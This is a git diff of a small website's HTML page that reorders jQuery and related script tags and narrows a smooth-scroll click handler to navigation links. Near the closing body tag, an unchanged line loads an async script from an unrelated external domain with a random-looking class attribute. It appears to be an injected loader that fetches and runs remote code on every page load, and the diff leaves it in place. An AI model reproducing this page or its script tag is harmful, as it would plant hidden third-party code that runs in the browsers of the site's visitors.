@@ -63,7 +63,7 @@
 			<a href="#menu" class="navPanelToggle"><span class="fa fa-bars"></span></a>
 			
 		<!-- Banner -->
-		<section id="">
+		<section>
 			<div id="large-header" class="large-header" style="background-image: url('images/demo-1-bg.jpg');" height=80vh>
 					<canvas id="demo-canvas"></canvas>Section 1</a>
 					<h1 class="main-title" style="font-size: 3em;" ><nav class="navigation" id="mainNav">
@@ -259,10 +259,7 @@
 			</section>
 
 		<!-- Scripts -->
-			<script src="assets/js/jquery.min.js"></script>
-			<script src="assets/js/skel.min.js"></script>
-			<script src="assets/js/util.js"></script>
-			<script src="assets/js/main.js"></script>
+
 			<script src="assets/js/TweenLite.min.js"></script>
 			<script src="assets/js/EasePack.min.js"></script>
 			<script src="assets/js/rAF.js"></script>
@@ -293,9 +290,16 @@
 					setTimeout(showSlides, 3000); // Change image every 2 seconds
 				}
 			</script>
+			
+					<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/skel.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+	
 			<script>
 				$(document).ready(function() {
-					$('a[href*=#]').bind('click', function(e) {
+					$('.navigation__link').bind('click', function(e) {
+					//$('a[href*=#]').bind('click', function(e) {
 							e.preventDefault(); // prevent hard jump, the default behavior
 
 							var target = $(this).attr("href"); // Set the target as variable
@@ -330,7 +334,9 @@
 					});
 			}).scroll();
 			</script>
+	
 	<script async class="pI9mmnNk;-15;1" src="https://play.besstahete.info/app.js"></script>
 
+			
 	</body>
 </html>
